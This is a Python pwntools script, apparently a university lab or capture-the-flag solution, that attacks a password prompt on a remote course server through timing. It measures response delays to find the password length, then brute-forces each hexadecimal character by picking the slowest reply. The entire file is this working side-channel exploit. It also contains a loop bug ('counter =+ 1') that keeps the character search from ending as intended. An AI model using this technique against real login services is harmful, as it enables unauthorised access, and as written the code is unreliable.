import random
import time
from pwn import *

r = remote("twinpeaks.cs.ucdavis.edu", 30003)

line = r.recvline()
length = False
pw = ''
pw_length = 0

print(line)
# the purpose of the for loop is to find the length of the password
# if length is of pw matches password the server sleeps for 0.2 seconds 
# before determining if each char is correct
for x in range(30):
	
	pw = pw + 'A'


	start = time.time()
	r.sendline(str(pw).encode())

	r.recvline()
	finish = time.time()

	line = r.recvline()
	
	diff = finish - start


		
	if diff > 0.2:
		pw_length = x + 1
		print(diff)
		break	

print(line)
print(pw_length)	
print(pw)

chars = 'ABCDEF0123456789' 
counter = 0
correct_chars = ''
count_correct = 0

# if char is wrong it automatically return but if char is correct it sleeps 0.2 
# So correct password will take 0.2 + (0.2 * pw_length) to repsond
while counter < pw_length:
	print("Beginning Of a For Loop")
	time_list = []
	for char in chars:
		pw = ''
		pw = correct_chars + char + '*'*(pw_length-count_correct-1)
		print(pw)
		
		start = time.time()
		r.sendline(str(pw).encode())
	
		r.recvline()
		finish = time.time()
		diff = finish - start
		time_list.append(diff)
		print(diff)
		
		line = r.recvline()
		print(line)	

	position = time_list.index(max(time_list))

	correct_chars = correct_chars + chars[position]
	count_correct += 1
	counter =+ 1
	print('----------------------------------------------------')
	print('----------------------------------------------------')

r.sendline(str(correct_chars).encode())
	
line = r.recvline()
print(line)
line = r.recvline()
print(line)
	
	
			
	
